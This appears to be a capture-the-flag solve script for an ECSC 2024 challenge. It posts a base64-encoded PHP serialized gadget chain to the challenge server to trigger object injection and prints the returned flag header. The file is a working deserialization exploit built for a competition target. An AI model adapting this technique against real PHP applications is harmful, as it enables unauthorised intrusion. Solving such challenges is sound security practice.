#!/usr/bin/env python3

import logging
import os
import requests

logging.disable()

URL = os.environ.get("URL", "https://afeverdream.challs.jeopardy.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]

payload = 'TzoxMDoiUGFnZUdhZGdldCI6Mzp7czoxNjoiAFBhZ2VHYWRnZXQAaGVhZCI7TzoxOToiU2VyaWFsaXphdGlvbkdhZGdldCI6Mjp7czoyODoiAFNlcmlhbGl6YXRpb25HYWRnZXQAcGF5bG9hZCI7TzoxNToiQnVmZmVyaW5nR2FkZ2V0IjoxOntzOjI1OiIAQnVmZmVyaW5nR2FkZ2V0AGZpbGVuYW1lIjtOO31zOjI5OiIAU2VyaWFsaXphdGlvbkdhZGdldABmaWxlbmFtZSI7czowOiIiO31zOjE2OiIAUGFnZUdhZGdldABib2R5IjtPOjEyOiJCYXNlNjRHYWRnZXQiOjM6e3M6MTc6IgBCYXNlNjRHYWRnZXQAc3RyIjtzOjA6IiI7czo4OiJmaWxlbmFtZSI7czo0OiJ0ZXN0IjtzOjQ6InRleHQiO086MTI6IkJhc2U2NEdhZGdldCI6Mzp7czoxNzoiAEJhc2U2NEdhZGdldABzdHIiO3M6MDoiIjtzOjg6ImZpbGVuYW1lIjtzOjQ6InRlc3QiO3M6NDoidGV4dCI7Tjt9fXM6MTk6IgBQYWdlR2FkZ2V0AGhlYWRlcnMiO2E6MDp7fX0='
resp = requests.post(URL, data={
    'payload': payload
})

print(resp.headers.get('FLAG'))
